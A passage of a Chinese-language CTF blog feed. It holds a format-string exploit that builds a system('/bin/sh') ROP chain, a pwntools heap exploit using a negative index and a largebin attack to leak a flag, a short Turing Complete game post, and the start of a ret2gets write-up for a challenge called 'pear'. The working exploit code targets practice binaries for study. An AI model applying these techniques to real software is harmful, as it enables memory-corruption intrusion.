class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x3a</span>)<br>strings(payload3,payload2.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br><br>binsh1=binsh&amp;<span class="hljs-number">0xff</span><br>binsh2=(binsh&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>binsh3=(binsh&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>binsh4=(binsh&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span><br>binsh5=(binsh&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xff</span><br>binsh6=(binsh&gt;&gt;<span class="hljs-number">40</span>)&amp;<span class="hljs-number">0xff</span><br><br>payload4=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(binsh1).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x40</span>)<br>strings(payload4,payload3.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload5=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(binsh2).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x41</span>)<br>strings(payload5,payload4.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload6=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(binsh3).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x42</span>)<br>strings(payload6,payload5.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload7=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(binsh4).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x43</span>)<br>strings(payload7,payload6.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload8=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(binsh5).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x44</span>)<br>strings(payload8,payload7.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload9=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(binsh6).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x45</span>)<br>strings(payload9,payload8.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br><br>ret=pop_rdi+<span class="hljs-number">1</span><br><br>ret1=ret&amp;<span class="hljs-number">0xff</span><br>ret2=(ret&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>ret3=(ret&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>ret4=(ret&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span><br>ret5=(ret&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xff</span><br>ret6=(ret&gt;&gt;<span class="hljs-number">40</span>)&amp;<span class="hljs-number">0xff</span><br><br>payload10=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(ret1).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x48</span>)<br>strings(payload10,payload9.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload11=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(ret2).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x49</span>)<br>strings(payload11,payload10.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload12=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(ret3).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x4a</span>)<br>strings(payload12,payload11.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload13=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(ret4).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x4b</span>)<br>strings(payload13,payload12.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload14=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(ret5).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x4c</span>)<br>strings(payload14,payload13.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload15=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(ret6).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x4d</span>)<br>strings(payload15,payload14.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br><br>sys1=sys&amp;<span class="hljs-number">0xff</span><br>sys2=(sys&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>sys3=(sys&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>sys4=(sys&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span><br>sys5=(sys&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xff</span><br>sys6=(sys&gt;&gt;<span class="hljs-number">40</span>)&amp;<span class="hljs-number">0xff</span><br><br>payload16=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(sys1).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x50</span>)<br>strings(payload16,payload15.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload17=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(sys2).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x51</span>)<br>strings(payload17,payload16.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload18=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(sys3).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x52</span>)<br>strings(payload18,payload17.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload19=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(sys4).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x53</span>)<br>strings(payload19,payload18.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload20=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(sys5).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x54</span>)<br>strings(payload20,payload19.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload21=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(sys6).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x55</span>)<br>strings(payload21,payload20.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br><br><span class="hljs-meta"># gdb.attach(io)</span><br><br>leave()<br><br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>感觉自己的脚本有点丑陋了，本来应该写循环来实现的，但是，vscode的自动补全太好用了，一直tab就打完了，所以就没用循环。</p><h2 id="2025-11-26——阴间CTF-CMWL"><a href="#2025-11-26——阴间CTF-CMWL" class="headerlink" title="2025.11.26——阴间CTF_CMWL"></a>2025.11.26——阴间CTF_CMWL</h2><p>只能分配largebin大小的chunk，限制了free次数为2次，write次数为1次，感觉应该也可以用house of apple吧，这个有沙箱，怎么现在的题都会加沙箱了吗，已经好久没有遇到没有沙箱的题目了。</p><p>打算先用house of apple去试试。</p><p>（拖欠………)</p><p>不知道为什么我感觉明明构造好了但是exit的时候没有进入链子（疲惫）明天在调调吧</p><h2 id="2025-11-27——pwn"><a href="#2025-11-27——pwn" class="headerlink" title="2025.11.27——pwn"></a>2025.11.27——pwn</h2><p>看了一下今天一个比赛的题，也没有名字，就干脆叫pwn了，没想到pwn竟然在运维赛道里面。</p><p>我当时一看这个题，就感觉应该是打house of apple，但是又给了我一个函数的的地址（可以算出起始地址）。我仔细一看，虽然开了沙箱，但是flag已经打开了直接放到堆里面了然后在放到了bss段上，然后当一个段上的数据满足条件，就可以直接输出flag。</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127203803-02nvlnp.png" alt="image"></p><p>堆块操作除了限制只能创建15个堆块以外，几乎没什么限制。</p><p>感觉很迷茫，倒不是做不出来，只是不知道到底想考什么，如果想考house of apple，给一个gift给我是要干什么呢，而且可以直接执行write输出堆上数据，不需要那个输出flag的函数了。如果选择覆盖bss段一段数据，直接输出flag，使用largebin attack，那么可以分配的chunk又不够。</p><p>（由于我这两天调house of apple的链子调得有点死了，所以不是很想使用house of apple去打）</p><p>（可能是因为我能力问题吧，我确实不知道出题人想考什么知识点）</p><p>但是看着在bss段和chunk里面的flag确实试心痒难耐啊，看得到，拿不到</p><p>于是我发现</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127212129-mnu36au.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127212139-v6jeq11.png" alt="image"></p><p>edit和show里面都没有检查n的合法行，而且n还是int类型，那么就可以直接写负数。</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127212823-sun1gmq.png" alt="image"></p><p>而0x55963aaf9008的地址刚好指向我自己（其实是因为我找了好久），如果我们索引到这，就可以往这读写，直接使用show的话，只有0x50,刚好在flag上面停住了，所以我们可以从这开始写。</p><p>这时候我们只需呀使用largebin attack把存储大小的地方修改为一个大数，就可以覆盖到索引输出chunk的地方，修改为flag的chunk就可以直接输出flag了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import*<br><br><span class="hljs-title function_">context</span><span class="hljs-params">(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)</span><br>io=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>def add(size,data):#<span class="hljs-number">0x400</span><span class="hljs-number">-0x500</span><br>    io.sendlineafter(b<span class="hljs-string">&#x27;5.exit\n&#x27;</span>,b<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;input size&gt;&gt;&#x27;</span>,str(size))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;input data&gt;&gt;&#x27;</span>,data)<br>    <br><br>def edit(index,data):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;5.exit\n&#x27;</span>,b<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;input index&gt;&gt;&#x27;</span>,str(index))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;input data&gt;&gt;&#x27;</span>,data)<br>    <br>def show(index):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;5.exit\n&#x27;</span>,b<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;input index&gt;&gt;&#x27;</span>,str(index))<br><br>def dele(index):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;5.exit\n&#x27;</span>,b<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;input index&gt;&gt;&#x27;</span>,str(index))<br>    <br>io.recvuntil(b<span class="hljs-string">&#x27;gift:\n&#x27;</span>)<br>data=<span class="hljs-type">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br>print(hex(data))<br>start=data<span class="hljs-number">-0x1a44</span><br>print(<span class="hljs-string">&quot;start:&quot;</span>,hex(start))<br><br>target=start+<span class="hljs-number">0x4088</span><br><br>add(<span class="hljs-number">0x430</span>,b<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x450</span>,b<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x450</span>,b<span class="hljs-string">&#x27;2&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x450</span>,b<span class="hljs-string">&#x27;3&#x27;</span>*<span class="hljs-number">0x20</span>)<br><br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x470</span>,b<span class="hljs-string">&#x27;4&#x27;</span>*<span class="hljs-number">0x20</span>)<br>show(<span class="hljs-number">2</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;data&gt;&gt;\n&#x27;</span>)<br>libc_addr=u64(io.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>io.recv(<span class="hljs-number">8</span>)<br>heap=u64(io.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>heap-=<span class="hljs-number">0x000055925fe0ed20</span><span class="hljs-number">-0x55925fe0d000</span><br>offset=<span class="hljs-number">0x00007f137d5ff0e0</span> - <span class="hljs-number">0x7f137d3e4000</span><br>libc_addr-=offset<br>print(<span class="hljs-string">&quot;libc；&quot;</span>,hex(libc_addr))<br>print(<span class="hljs-string">&quot;heap:&quot;</span>,hex(heap))<br>dele(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">2</span>,p64(libc_addr+offset)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0</span>)+p64(target<span class="hljs-number">-0x20</span>))<br>add(<span class="hljs-number">0x470</span>,b<span class="hljs-string">&#x27;5&#x27;</span>*<span class="hljs-number">0x20</span>)<br><br><span class="hljs-built_in">stdout</span>=libc_addr+libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br><span class="hljs-built_in">stdin</span>=libc_addr+libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br><span class="hljs-built_in">stderr</span>=libc_addr+libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>]<br>gdb.attach(io)<br>payload=p64(target)+b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-built_in">stdout</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-built_in">stdin</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-built_in">stderr</span>)+p64(<span class="hljs-number">0</span>)+b<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x70</span>+p64(heap+<span class="hljs-number">0x480</span>)<br>edit(<span class="hljs-number">-23</span>,payload)<br>show(<span class="hljs-number">0</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127213359-s76r30j.png" alt="image"></p><p>果然还是题目不严谨，才能这么做吧</p>]]></content>
    
    
    <categories>
      
      <category>刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Turing Complete——寄存器之间</title>
    <link href="/post/turing-complete----ji-cun-qi-zhi-jian-ziybm1.html"/>
    <url>/post/turing-complete----ji-cun-qi-zhi-jian-ziybm1.html</url>
    
    <content type="html"><![CDATA[<h1 id="Turing-Complete——寄存器之间"><a href="#Turing-Complete——寄存器之间" class="headerlink" title="Turing Complete——寄存器之间"></a>Turing Complete——寄存器之间</h1><p>看不懂QwQ</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251111182915-cc34zwy.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251111182930-wr8e2po.png" alt="image"></p><p>好啦，看懂啦，根据指令集把值传输到特定位置</p><p>既然是这样的话，我们就需要根据指令控制每次启用什么元件。但是这个控制每一种情况只对应一个开关启用的布线十分复杂，会把整体布线弄得很乱，于是我想起我在小盒子那一关里面有0-3的开关启用，于是我把它复制到了元件工坊里面，考虑到我们这里需要至少7个选择开关，于是我加了一个启用开关，这样两个这样的元件就可以有8个选择开关了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251112191606-fxiujbq.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251112191640-xzx3ms5.png" alt="image"></p><p>我感觉这一关最复杂的地方已经过去了，剩下的就是把他们都连接起来，确保每个寄存器之间相通，可以进行值的传输就可以了s</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251112191818-ka1yyt5.png" alt="image"></p><p>芜湖~也不是很难嘛，这一关</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251112191859-gt0u260.png" alt="image"></p><p>QwQ玩到后面才发现原来本来就已经有了三位解码器了，我还在那自己搞，太久没用这个东西我都忘记了。</p>]]></content>
    
    
    <categories>
      
      <category>游戏</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Turing Complete</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pear</title>
    <link href="/post/pear-z12hbrb.html"/>
    <url>/post/pear-z12hbrb.html</url>
    
    <content type="html"><![CDATA[<h1 id="pear"><a href="#pear" class="headerlink" title="pear"></a>pear</h1><p>道阻且长，行则将至。</p><p>‍</p><p>很高兴，学到了一种新的栈上的利用手法。好久没看栈，才发现在高版本的libc中pop rdi；ret几乎已经销声匿迹了，虽然gets在现在的程序中几乎已经不会再使用，但能够学习到这样巧妙的攻击方式还是很高兴的。</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251015151352-ijmhw0l.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251015151412-cnzhl3m.png" alt="image"></p><p>一个平平无奇，看似十分简单的栈上的题目。一个很显而易见的溢出点gets</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>本来以为就是一个ret2libc，但是脚本写了一半去寻找gadget的时候，发现没有<code>pop rdi;ret</code>​，当时也没当一回事（主要是之前也没了解过ret2gets），之前也是遇到过几次没有<code>pop rdi;ret</code>的题目，一次是xyctf里面的ret2libc的复仇，还有一次是京麒的Oldwine。所以在最开始我以为是代码段的复用</p><h3 id="误入歧途"><a href="#误入歧途" class="headerlink" title="误入歧途"></a>误入歧途</h3><p>通过我坚持不懈的查看代码段，我发现了一处可以利用的小片段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">gadget1=<span class="hljs-number">0x0000000004011EC</span> <span class="hljs-comment">#get&amp;printf</span><br>gadget2=<span class="hljs-number">0x00000000004011FD</span> <span class="hljs-comment">#printf</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251015152208-vg2qgwd.png" alt="image"></p><p>我发现这里会根据rbp+0x80处的值设置rdi，所以很显而易见的，我想到了通过第一次覆盖的时候设置rbp的值到bss段上，那里存放着很多有用的地址例如：stdin，stdout之类的。然后我就可以设置rdi的值然后进行泄露。事实上，我也确实通过这一方法泄露出了stdout的地址</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251015153139-axty90q.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251015153352-6sk4vdv.png" alt="image"></p><p>但是这样泄露的话，会进行栈迁移到bss段上（开始结尾的地方有一个leave ret，调用了printf后又会进行一次leave ret），然后就没办法控制后续程序，所以我修改了一下打算先调用这个<code>gadget1=0x0000000004011EC #get&amp;printf</code>​然后再调用<code>gadget2=0x00000000004011FD #printf</code>这样就可以控制返回地址的情况下泄露地址</p><p>这是我的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+p64(bss+<span class="hljs-number">0x80</span>+<span class="hljs-number">0x80</span>)+p64(gadget1)<br>payload1=p64(main_addr)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p64(bss+<span class="hljs-number">0x80</span>)+p64(gadget2)<br>gdb.attach(io)<br>io.sendline(payload)<br><br><span class="hljs-comment"># io.recvuntil(b&#x27;Welcome to Tech Olympics 2025, Dear aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb0@@&#x27;)</span><br>io.sendline(payload1)<br><span class="hljs-comment"># io.recvuntil(b&#x27;Welcome to Tech Olympics 2025, Dear &#x27;)</span><br><span class="hljs-comment"># data=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="hljs-comment"># log.success(&#x27;leak:&#x27;+hex(data))</span><br></code></pre></td></tr></table></figure><p>我的想法是（看不明白也没关系，反正是错的）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/dfd931e31ad3260443c875b990a5472f_720-20251015163345-4sw9vlu.jpg" alt="dfd931e31ad3260443c875b990a5472f_720"></p><p>然后，程序就崩了（此时我真的感觉自己的想法已经可以打穿这道题目了）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250927220848-jgcg101.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250927220859-gwtc16d.png" alt="image"></p><p>后来发现不知道为什么，把我要泄露的地方的地址给我改了，也不知道是什么原因，看了挺久，但是也没有什么解决办法。然后这道题目还找不到wp，就放弃了一段时间</p><h3 id="步入正轨"><a href="#步入正轨" class="headerlink" title="步入正轨"></a>步入正轨</h3><p>之前偶然在群里看见有人在问ret2gets，打算找时间来学学，我一看，这不和我这道题目的条件和限制一模一样吗。</p><p>终于找到了正确的方向了，原来是ret2gets，之前没了解过，还在想为什么有人能做这么快，原来是我方向找错了。</p><p>尝试了一下</p><p>虽然还没做出来，但是已经有东西泄露出来了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251015140422-47sxyfu.png" alt="image"></p><p>感觉再调调就可以了，太高兴了</p><p>然后需要注意的就是对齐问题，加一个ret就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><br>elf=ELF(<span class="hljs-string">&#x27;./pear&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/home/ouyang/.cache/.pwntools-cache-3.10/libcdb/sha1/5b02e178d9ded9b8c37a605e7a233687aa45f72f&#x27;</span>)<br>libc_dir = <span class="hljs-string">&quot;/home/ouyang/.cache/.pwntools-cache-3.10/libcdb/sha1&quot;</span><br>libc_file = libc_dir + <span class="hljs-string">&quot;/5b02e178d9ded9b8c37a605e7a233687aa45f72f&quot;</span><br><br>io = process([<span class="hljs-string">&quot;./pear&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>: libc_file&#125;)<br><br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>get_addr=<span class="hljs-number">0x401080</span><br>leave_ret=<span 